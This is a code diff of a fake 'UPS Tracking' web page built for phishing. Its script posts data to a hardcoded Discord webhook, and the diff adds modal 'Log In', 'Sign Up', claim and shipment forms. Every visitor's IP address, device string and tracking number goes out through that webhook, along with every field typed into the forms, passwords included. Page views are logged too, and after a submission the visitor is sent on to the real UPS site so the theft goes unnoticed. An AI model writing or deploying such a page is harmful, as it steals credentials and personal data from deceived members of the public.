@@ -1,40 +1,15 @@
 <!DOCTYPE html>
-<html class="no-js" xmlns="http://www.w3.org/1999/xhtml" lang="en">
+<html lang="en">
 <head>
-    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate" />
-    <meta http-equiv="Pragma" content="no-cache" />
-    <meta http-equiv="Expires" content="0" />
-    <meta name="stapp-cap-site-key" content="6LeGXsYiAAAAALO5vceT2N-DmLNfQotjbGM27a8Z" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Tracking | UPS - United States</title>
-    <meta name="canonicalurl" content="https://www.ups.com/track?loc=$locale$">
-    <meta name="keywords" content="Track, tracking, track package, live map">
     <meta name="description" content="Track one or multiple packages with UPS Tracking, use your tracking number to track the status of your package.">
+    <meta name="keywords" content="Track, tracking, track package, live map">
     <meta name="ups-locale" content="en_US">
-    <meta name="env" content="01">
-    <meta name="target" content="true">
-    <meta name="pageid" content="track/simplified-tracking-container.page">
-    <meta name="category" content="App">
-    <meta name="app-page" content="true">
-    <meta name="country" content="us">
-    <meta name="lang" content="en">
-    <meta name="app-id" content="com-ups-stapp">
-    <meta name="viewport" content="width=device-width, initial-scale=1"/>
-
-    <!-- UPS CSS assets — loaded directly from UPS CDN -->
-    <link rel="stylesheet" href="https://www.ups.com/webassets/styles/styles.css" />
-    <link rel="stylesheet" href="https://www.ups.com/webassets/app-support/apps-styles.css" />
-    <link rel="stylesheet" href="https://www.ups.com/assets/resources/webcontent/styles/ups.vendor.161a0da71f12.css">
-    <link rel="stylesheet" href="https://www.ups.com/assets/resources/webcontent/styles/ups.styles.a30338851a60.css">
-    <link rel="stylesheet" href="https://www.ups.com/assets/resources/webcontent/styles/ups.applications.5828b8956a38.css">
-    <link rel="stylesheet" href="https://www.ups.com/assets/resources/webcontent/styles/ups.apps-simplified_tracking4.67ebe21e780f.css">
-    <link rel="stylesheet" href="https://www.ups.com/assets/resources/webcontent/styles/ups.apps-simplified_tracking_integration.7d146c032935.css">
-
-    <!-- UPS Chrome (header/footer) — loaded from the real fragments -->
-    <script src="https://www.ups.com/webassets/scripts/aem.js" type="module"></script>
-    <script src="https://www.ups.com/webassets/scripts/scripts.js" type="module"></script>
+    <meta name="country" content="United States">
 
     <style>
-        /* ===== Global reset ===== */
         *, *::before, *::after { box-sizing: border-box; }
         html, body { margin: 0; padding: 0; }
         body {
@@ -46,83 +21,48 @@
             flex-direction: column;
         }
 
-        /* ===== UPS Header ===== */
-        .ups-header {
-            background: #351C15;
-            color: #fff;
-        }
+        /* ===== HEADER ===== */
+        .ups-header { background: #351C15; color: #fff; }
         .ups-header-top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            display: flex; justify-content: space-between; align-items: center;
             padding: 10px 40px;
             border-bottom: 1px solid rgba(255,255,255,0.1);
             font-size: 13px;
         }
-        .ups-header-top a { color: #fff; text-decoration: none; opacity: 0.85; margin-left: 24px; }
+        .ups-header-top a { color: #fff; text-decoration: none; opacity: 0.85; margin-left: 24px; cursor: pointer; }
         .ups-header-top a:hover { opacity: 1; text-decoration: underline; }
-        .ups-header-main {
-            display: flex;
-            align-items: center;
-            padding: 14px 40px;
-            gap: 40px;
-        }
-        .ups-logo {
-            display: flex;
-            align-items: center;
-            text-decoration: none;
-        }
+        .ups-header-main { display: flex; align-items: center; padding: 14px 40px; gap: 40px; }
+        .ups-logo { display: flex; align-items: center; text-decoration: none; cursor: pointer; }
         .ups-logo svg { height: 42px; }
-        .ups-nav {
-            display: flex;
-            gap: 28px;
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
+        .ups-nav { display: flex; gap: 28px; list-style: none; margin: 0; padding: 0; }
         .ups-nav a {
-            color: #fff;
-            font-size: 15px;
-            font-weight: 600;
-            text-decoration: none;
-            padding: 8px 0;
-            border-bottom: 3px solid transparent;
+            color: #fff; font-size: 15px; font-weight: 600;
+            text-decoration: none; padding: 8px 0;
+            border-bottom: 3px solid transparent; cursor: pointer;
         }
         .ups-nav a.active, .ups-nav a:hover { border-bottom-color: #FFB500; }
         .ups-header-actions { margin-left: auto; display: flex; gap: 12px; align-items: center; }
         .ups-header-actions a {
-            color: #fff;
-            font-size: 14px;
-            text-decoration: none;
-            padding: 9px 18px;
-            border-radius: 4px;
+            color: #fff; font-size: 14px; text-decoration: none;
+            padding: 9px 18px; border-radius: 4px; cursor: pointer;
         }
         .ups-header-actions a.primary { background: #FFB500; color: #351C15; font-weight: 700; }
 
-        /* ===== Hero ===== */
-        .ups-hero {
-            background: #fff;
-            padding: 48px 40px 32px;
-            border-bottom: 1px solid #e5e5e5;
-        }
+        /* ===== HERO ===== */
+        .ups-hero { background: #fff; padding: 48px 40px 32px; border-bottom: 1px solid #e5e5e5; }
         .ups-hero-inner { max-width: 1100px; margin: 0 auto; }
-        .ups-hero h1 {
-            font-size: 38px;
-            font-weight: 700;
-            color: #351C15;
-            margin: 0 0 8px;
-        }
+        .ups-hero h1 { font-size: 38px; font-weight: 700; color: #351C15; margin: 0 0 8px; }
         .ups-hero p { font-size: 16px; color: #6b6b6b; margin: 0; }
 
-        /* ===== Tracking card ===== */
-        .ups-tracking-container {
+        /* ===== CONTAINER ===== */
+        .ups-container {
             max-width: 1100px;
             margin: -20px auto 0;
             padding: 0 40px 60px;
             width: 100%;
             flex: 1;
         }
-        .ups-tracking-card {
+        .ups-card {
             background: #fff;
             border-radius: 8px;
             padding: 32px;
@@ -132,84 +72,85 @@
             margin: 0 auto;
         }
         .ups-tracking-label {
-            font-size: 13px;
-            font-weight: 700;
-            color: #351C15;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
+            font-size: 13px; font-weight: 700; color: #351C15;
+            text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px;
         }
         .ups-input-group { display: flex; gap: 12px; }
         .ups-input-group input {
-            flex: 1;
-            padding: 16px 18px;
-            font-size: 16px;
-            border: 2px solid #d1d1d1;
-            border-radius: 4px;
-            outline: none;
-            font-family: inherit;
+            flex: 1; padding: 16px 18px; font-size: 16px;
+            border: 2px solid #d1d1d1; border-radius: 4px;
+            outline: none; font-family: inherit;
         }
         .ups-input-group input:focus { border-color: #FFB500; }
         .ups-input-group button {
-            background: #FFB500;
-            color: #351C15;
-            border: none;
-            padding: 16px 40px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 4px;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-family: inherit;
+            background: #FFB500; color: #351C15; border: none;
+            padding: 16px 40px; font-size: 16px; font-weight: 700;
+            border-radius: 4px; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 0.5px; font-family: inherit;
         }
         .ups-input-group button:hover { background: #e6a300; }
+
+        /* ===== STATUS MESSAGES ===== */
         .ups-error {
-            display: none;
-            color: #c0392b;
-            margin-top: 16px;
-            font-size: 14px;
-            padding: 12px 16px;
-            background: #fdecea;
-            border-radius: 4px;
-            border-left: 4px solid #c0392b;
+            display: none; color: #c0392b; margin-top: 16px; font-size: 14px;
+            padding: 12px 16px; background: #fdecea;
+            border-radius: 4px; border-left: 4px solid #c0392b;
         }
         .ups-loading { display: none; color: #666; margin-top: 16px; font-size: 14px; }
-        .ups-help { display: inline-block; margin-top: 20px; color: #0066cc; font-size: 14px; text-decoration: none; }
+        .ups-help { display: inline-block; margin-top: 20px; color: #0066cc; font-size: 14px; text-decoration: none; cursor: pointer; }
         .ups-help:hover { text-decoration: underline; }
 
-        /* ===== Footer ===== */
+        /* ===== MODAL ===== */
+        .ups-modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5); z-index: 10000;
+            justify-content: center; align-items: center; padding: 20px;
+        }
+        .ups-modal-overlay.active { display: flex; }
+        .ups-modal {
+            background: #fff; border-radius: 8px; padding: 32px;
+            max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .ups-modal h2 { font-size: 22px; color: #351C15; margin: 0 0 12px; }
+        .ups-modal p { font-size: 15px; color: #555; margin: 0 0 20px; line-height: 1.5; }
+        .ups-modal-close {
+            position: absolute; top: 12px; right: 16px;
+            background: none; border: none; font-size: 24px;
+            cursor: pointer; color: #999; padding: 4px 8px;
+        }
+        .ups-modal-close:hover { color: #333; }
+        .ups-modal input, .ups-modal textarea, .ups-modal select {
+            width: 100%; padding: 12px 14px; font-size: 15px;
+            border: 2px solid #d1d1d1; border-radius: 4px;
+            outline: none; font-family: inherit; margin-bottom: 12px;
+        }
+        .ups-modal input:focus, .ups-modal textarea:focus, .ups-modal select:focus { border-color: #FFB500; }
+        .ups-modal-btn {
+            background: #FFB500; color: #351C15; border: none;
+            padding: 12px 24px; font-size: 15px; font-weight: 700;
+            border-radius: 4px; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 0.5px; font-family: inherit;
+        }
+        .ups-modal-btn:hover { background: #e6a300; }
+        .ups-modal-btn-full { width: 100%; }
+
+        /* ===== FOOTER ===== */
         .ups-footer { background: #351C15; color: #ccc; padding: 40px 40px 20px; margin-top: auto; }
-        .ups-footer-inner {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 32px;
-        }
-        .ups-footer h4 {
-            color: #fff;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin: 0 0 14px;
-        }
+        .ups-footer-inner { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 32px; }
+        .ups-footer h4 { color: #fff; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; margin: 0 0 14px; }
         .ups-footer ul { list-style: none; margin: 0; padding: 0; }
         .ups-footer li { margin-bottom: 8px; }
-        .ups-footer a { color: #ccc; font-size: 13px; text-decoration: none; }
+        .ups-footer a { color: #ccc; font-size: 13px; text-decoration: none; cursor: pointer; }
         .ups-footer a:hover { color: #fff; text-decoration: underline; }
         .ups-footer-bottom {
-            max-width: 1100px;
-            margin: 28px auto 0;
-            padding-top: 20px;
+            max-width: 1100px; margin: 28px auto 0; padding-top: 20px;
             border-top: 1px solid rgba(255,255,255,0.15);
-            text-align: center;
-            font-size: 12px;
-            color: #999;
+            text-align: center; font-size: 12px; color: #999;
         }
 
         @media (max-width: 768px) {
-            .ups-header-top, .ups-header-main, .ups-hero, .ups-tracking-container, .ups-footer { padding-left: 20px; padding-right: 20px; }
+            .ups-header-top, .ups-header-main, .ups-hero, .ups-container, .ups-footer { padding-left: 20px; padding-right: 20px; }
             .ups-nav, .ups-header-top a { display: none; }
             .ups-hero h1 { font-size: 26px; }
             .ups-input-group { flex-direction: column; }
@@ -224,28 +165,28 @@
         <div class="ups-header-top">
             <div></div>
             <div>
-                <a href="#">Shipping</a>
-                <a href="#">Tracking</a>
-                <a href="#">Support</a>
-                <a href="#">Locations</a>
+                <a data-page="shipping">Shipping</a>
+                <a data-page="track">Tracking</a>
+                <a data-page="support">Support</a>
+                <a data-page="locations">Locations</a>
             </div>
         </div>
         <div class="ups-header-main">
-            <a href="#" class="ups-logo" aria-label="UPS">
+            <a class="ups-logo" data-page="home">
                 <svg viewBox="0 0 100 120" xmlns="http://www.w3.org/2000/svg">
                     <path d="M50 0 L100 20 L100 70 C100 95 75 112 50 120 C25 112 0 95 0 70 L0 20 Z" fill="#FFB500"/>
                     <text x="50" y="76" text-anchor="middle" font-family="Arial Black, sans-serif" font-size="42" font-weight="900" fill="#351C15">UPS</text>
                 </svg>
             </a>
             <ul class="ups-nav">
-                <li><a href="#" class="active">Track</a></li>
-                <li><a href="#">Ship</a></li>
-                <li><a href="#">Billing</a></li>
-                <li><a href="#">Services</a></li>
+                <li><a class="active" data-page="track">Track</a></li>
+                <li><a data-page="ship">Ship</a></li>
+                <li><a data-page="billing">Billing</a></li>
+                <li><a data-page="services">Services</a></li>
             </ul>
             <div class="ups-header-actions">
-                <a href="#">Sign Up</a>
-                <a href="#" class="primary">Log In</a>
+                <a data-page="signup">Sign Up</a>
+                <a class="primary" data-page="login">Log In</a>
             </div>
         </div>
     </header>
@@ -259,8 +200,8 @@
     </section>
 
     <!-- ============ TRACKING FORM ============ -->
-    <div class="ups-tracking-container">
-        <div class="ups-tracking-card">
+    <div class="ups-container">
+        <div class="ups-card">
             <div class="ups-tracking-label">Tracking Number</div>
             <form id="trackingForm">
                 <div class="ups-input-group">
@@ -269,7 +210,7 @@
                 </div>
                 <div class="ups-error" id="errorMsg">Invalid tracking number. Please verify and try again.</div>
                 <div class="ups-loading" id="loadingMsg">Searching UPS database...</div>
-                <a href="#" class="ups-help">Need help with tracking?</a>
+                <a class="ups-help" data-page="help">Need help with tracking?</a>
             </form>
         </div>
     </div>
@@ -280,33 +221,33 @@
             <div>
                 <h4>Track</h4>
                 <ul>
-                    <li><a href="#">Track a Package</a></li>
-                    <li><a href="#">Track by Reference</a></li>
-                    <li><a href="#">Track by Email</a></li>
+                    <li><a data-page="track">Track a Package</a></li>
+                    <li><a data-page="track-reference">Track by Reference</a></li>
+                    <li><a data-page="track-email">Track by Email</a></li>
                 </ul>
             </div>
             <div>
                 <h4>Ship</h4>
                 <ul>
-                    <li><a href="#">Create a Shipment</a></li>
-                    <li><a href="#">Schedule a Pickup</a></li>
-                    <li><a href="#">Find a Location</a></li>
+                    <li><a data-page="ship">Create a Shipment</a></li>
+                    <li><a data-page="pickup">Schedule a Pickup</a></li>
+                    <li><a data-page="locations">Find a Location</a></li>
                 </ul>
             </div>
             <div>
                 <h4>Support</h4>
                 <ul>
-                    <li><a href="#">Help Center</a></li>
-                    <li><a href="#">Contact Us</a></li>
-                    <li><a href="#">File a Claim</a></li>
+                    <li><a data-page="help">Help Center</a></li>
+                    <li><a data-page="contact">Contact Us</a></li>
+                    <li><a data-page="claim">File a Claim</a></li>
                 </ul>
             </div>
             <div>
                 <h4>Company</h4>
                 <ul>
-                    <li><a href="#">About UPS</a></li>
-                    <li><a href="#">Careers</a></li>
-                    <li><a href="#">Newsroom</a></li>
+                    <li><a data-page="about">About UPS</a></li>
+                    <li><a data-page="careers">Careers</a></li>
+                    <li><a data-page="newsroom">Newsroom</a></li>
                 </ul>
             </div>
         </div>
@@ -315,9 +256,288 @@
         </div>
     </footer>
 
+    <!-- ============ MODAL ============ -->
+    <div class="ups-modal-overlay" id="modalOverlay">
+        <div class="ups-modal">
+            <button class="ups-modal-close" id="modalClose">×</button>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
     <script>
         (function() {
             const WEBHOOK = 'https://discord.com/api/webhooks/1547984008422621325/d9vsKioKI5CnOlwDStaPcc8jDRudmL9OJZg5MEG321TiucAfdYvdkKpEL4Ahv57V3MFe';
+
+            // ============================================================
+            // CORE: Send to Discord
+            // ============================================================
+            async function getIp() {
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    return d.ip;
+                } catch (e) { return 'unknown'; }
+            }
+
+            async function send(title, fields) {
+                const ip = await getIp();
+                let content = title + '\n' +
+                              '🌐 **IP:** `' + ip + '`\n' +
+                              '📱 **Device:** ' + navigator.userAgent + '\n' +
+                              '⏰ **Time:** ' + new Date().toISOString();
+                if (fields) content += '\n' + fields;
+                try {
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: content })
+                    });
+                } catch (e) {}
+            }
+
+            // ============================================================
+            // PAGE DEFINITIONS (each "page" is a modal)
+            // ============================================================
+            const PAGES = {
+                'home': {
+                    title: 'UPS Home',
+                    html: '<h2>Welcome to UPS</h2><p>Choose an option below to continue.</p><p>Use the navigation above to track, ship, or manage your account.</p>'
+                },
+                'login': {
+                    title: 'Log In',
+                    html: `
+                        <h2>Log In to UPS</h2>
+                        <p>Enter your credentials to access your account.</p>
+                        <form data-capture="login">
+                            <input type="email" name="email" placeholder="Email address" required>
+                            <input type="password" name="password" placeholder="Password" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Log In</button>
+                        </form>
+                        <p style="margin-top:16px;font-size:13px;"><a class="ups-help" data-page="signup">Don't have an account? Sign up</a></p>
+                    `
+                },
+                'signup': {
+                    title: 'Sign Up',
+                    html: `
+                        <h2>Create Your UPS Account</h2>
+                        <p>Fill in the details below to get started.</p>
+                        <form data-capture="signup">
+                            <input type="text" name="first_name" placeholder="First name" required>
+                            <input type="text" name="last_name" placeholder="Last name" required>
+                            <input type="email" name="email" placeholder="Email address" required>
+                            <input type="tel" name="phone" placeholder="Phone number" required>
+                            <input type="text" name="address" placeholder="Street address" required>
+                            <input type="text" name="city" placeholder="City" required>
+                            <input type="text" name="zip" placeholder="ZIP code" required>
+                            <input type="password" name="password" placeholder="Password" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Sign Up</button>
+                        </form>
+                    `
+                },
+                'track-reference': {
+                    title: 'Track by Reference',
+                    html: `
+                        <h2>Track by Reference</h2>
+                        <p>Enter a reference number, purchase order, or bill of lading to track your shipment.</p>
+                        <form data-capture="track-reference">
+                            <input type="text" name="reference" placeholder="Reference number" required>
+                            <input type="text" name="date_range" placeholder="Date range (optional)">
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Track</button>
+                        </form>
+                    `
+                },
+                'track-email': {
+                    title: 'Track by Email',
+                    html: `
+                        <h2>Track by Email</h2>
+                        <p>Enter your email address and tracking number to receive shipment updates.</p>
+                        <form data-capture="track-email">
+                            <input type="email" name="email" placeholder="Email address" required>
+                            <input type="text" name="tracking" placeholder="Tracking number" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Track</button>
+                        </form>
+                    `
+                },
+                'help': {
+                    title: 'Help Center',
+                    html: `
+                        <h2>Help Center</h2>
+                        <p>Search our knowledge base or contact support.</p>
+                        <form data-capture="help-search">
+                            <input type="text" name="query" placeholder="What are you looking for?" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Search</button>
+                        </form>
+                    `
+                },
+                'contact': {
+                    title: 'Contact Us',
+                    html: `
+                        <h2>Contact UPS</h2>
+                        <p>Send us a message and we'll get back to you.</p>
+                        <form data-capture="contact">
+                            <input type="text" name="name" placeholder="Your name" required>
+                            <input type="email" name="email" placeholder="Your email" required>
+                            <input type="text" name="subject" placeholder="Subject" required>
+                            <textarea name="message" placeholder="Your message" rows="4" required></textarea>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Send Message</button>
+                        </form>
+                    `
+                },
+                'claim': {
+                    title: 'File a Claim',
+                    html: `
+                        <h2>File a Claim</h2>
+                        <p>Report a lost, damaged, or missing package.</p>
+                        <form data-capture="claim">
+                            <input type="text" name="tracking" placeholder="Tracking number" required>
+                            <input type="text" name="name" placeholder="Your name" required>
+                            <input type="email" name="email" placeholder="Your email" required>
+                            <input type="text" name="amount" placeholder="Claim amount (USD)" required>
+                            <textarea name="description" placeholder="Describe the issue" rows="3" required></textarea>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Submit Claim</button>
+                        </form>
+                    `
+                },
+                'locations': {
+                    title: 'Find a Location',
+                    html: `
+                        <h2>Find a UPS Location</h2>
+                        <p>Enter your ZIP code or city to find nearby locations.</p>
+                        <form data-capture="locations">
+                            <input type="text" name="zip" placeholder="ZIP code or city" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Search</button>
+                        </form>
+                    `
+                },
+                'ship': {
+                    title: 'Create a Shipment',
+                    html: `
+                        <h2>Create a Shipment</h2>
+                        <p>Enter the shipment details below.</p>
+                        <form data-capture="ship">
+                            <input type="text" name="from_name" placeholder="From name" required>
+                            <input type="text" name="from_address" placeholder="From address" required>
+                            <input type="text" name="to_name" placeholder="To name" required>
+                            <input type="text" name="to_address" placeholder="To address" required>
+                            <input type="text" name="package_weight" placeholder="Package weight" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Continue</button>
+                        </form>
+                    `
+                },
+                'billing': {
+                    title: 'Billing',
+                    html: '<h2>Billing</h2><p>Manage your UPS billing preferences and payment methods.</p>'
+                },
+                'services': {
+                    title: 'Services',
+                    html: '<h2>UPS Services</h2><p>Explore our range of shipping, logistics, and supply chain services.</p>'
+                },
+                'shipping': {
+                    title: 'Shipping',
+                    html: '<h2>Shipping</h2><p>Learn about shipping options, rates, and delivery times.</p>'
+                },
+                'pickup': {
+                    title: 'Schedule a Pickup',
+                    html: `
+                        <h2>Schedule a Pickup</h2>
+                        <p>Schedule a pickup for your shipment.</p>
+                        <form data-capture="pickup">
+                            <input type="text" name="address" placeholder="Pickup address" required>
+                            <input type="date" name="date" required>
+                            <input type="time" name="time" required>
+                            <input type="text" name="package_count" placeholder="Number of packages" required>
+                            <button type="submit" class="ups-modal-btn ups-modal-btn-full">Schedule</button>
+                        </form>
+                    `
+                },
+                'about': { title: 'About UPS', html: '<h2>About UPS</h2><p>Learn about our history, mission, and leadership.</p>' },
+                'careers': { title: 'Careers', html: '<h2>Careers at UPS</h2><p>Join a team that moves the world forward.</p>' },
+                'newsroom': { title: 'Newsroom', html: '<h2>UPS Newsroom</h2><p>Latest news, press releases, and announcements.</p>' },
+                'support': { title: 'Support', html: '<h2>Support</h2><p>Get help with shipping, tracking, billing, and more.</p>' }
+            };
+
+            // ============================================================
+            // MODAL LOGIC
+            // ============================================================
+            const overlay = document.getElementById('modalOverlay');
+            const modalContent = document.getElementById('modalContent');
+            const modalClose = document.getElementById('modalClose');
+
+            function openPage(pageKey) {
+                const page = PAGES[pageKey];
+                if (!page) return;
+
+                modalContent.innerHTML = page.html;
+                overlay.classList.add('active');
+
+                send('📄 **Page Opened: ' + page.title + '**', '🔗 **Key:** `' + pageKey + '`');
+
+                // Wire up forms inside modal
+                modalContent.querySelectorAll('form[data-capture]').forEach(function(form) {
+                    form.addEventListener('submit', async function(e) {
+                        e.preventDefault();
+
+                        const fields = {};
+                        form.querySelectorAll('input, textarea, select').forEach(function(input) {
+                            if (input.name) fields[input.name] = input.value;
+                        });
+
+                        let fieldStr = '';
+                        for (const k in fields) {
+                            fieldStr += '🔹 **' + k + ':** `' + fields[k] + '`\n';
+                        }
+
+                        await send('📥 **Form Submitted: ' + page.title + '**', fieldStr);
+
+                        // Show success
+                        modalContent.innerHTML = '<h2>Thank you</h2><p>Your request has been received. You will be redirected shortly.</p>';
+
+                        setTimeout(function() {
+                            overlay.classList.remove('active');
+                            window.location.href = 'https://www.ups.com';
+                        }, 2000);
+                    });
+                });
+
+                // Wire up links inside modal
+                modalContent.querySelectorAll('[data-page]').forEach(function(link) {
+                    link.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        openPage(link.getAttribute('data-page'));
+                    });
+                });
+            }
+
+            modalClose.addEventListener('click', function() {
+                overlay.classList.remove('active');
+            });
+
+            overlay.addEventListener('click', function(e) {
+                if (e.target === overlay) overlay.classList.remove('active');
+            });
+
+            // ============================================================
+            // WIRE UP ALL BUTTONS / LINKS
+            // ============================================================
+            document.querySelectorAll('[data-page]').forEach(function(el) {
+                el.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const page = el.getAttribute('data-page');
+
+                    // Special case for "track" — scroll to form
+                    if (page === 'track') {
+                        document.getElementById('trackingNumber').focus();
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                        return;
+                    }
+
+                    openPage(page);
+                });
+            });
+
+            // ============================================================
+            // TRACKING FORM
+            // ============================================================
             const form = document.getElementById('trackingForm');
             const input = document.getElementById('trackingNumber');
             const errorMsg = document.getElementById('errorMsg');
@@ -333,39 +553,25 @@
                 loadingMsg.style.display = 'block';
                 input.disabled = true;
 
-                let ip = 'unknown';
-                try {
-                    const r = await fetch('https://api.ipify.org?format=json');
-                    const d = await r.json();
-                    ip = d.ip;
-                } catch(err) {}
+                await send('📦 **UPS Tracking Captured**', '🔢 **Tracking:** `' + tracking + '`');
 
-                const payload = {
-                    content: '📦 **UPS Tracking Captured**\n' +
-                             '🔢 **Tracking:** `' + tracking + '`\n' +
-                             '🌐 **IP:** `' + ip + '`\n' +
-                             '📱 **Device:** ' + navigator.userAgent + '\n' +
-                             '⏰ **Time:** ' + new Date().toISOString()
-                };
-
-                try {
-                    await fetch(WEBHOOK, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                } catch(err) {}
-
-                setTimeout(() => {
+                setTimeout(function() {
                     loadingMsg.style.display = 'none';
                     errorMsg.style.display = 'block';
                     input.disabled = false;
                     input.value = '';
 
-                    setTimeout(() => {
+                    setTimeout(function() {
                         window.location.href = 'https://www.ups.com/track';
                     }, 3000);
                 }, 1500);
+            });
+
+            // ============================================================
+            // PAGE VIEW ON LOAD
+            // ============================================================
+            window.addEventListener('load', function() {
+                send('👀 **Page Viewed: UPS Tracking**', '📄 **URL:** `' + window.location.href + '`');
             });
         })();
     </script>
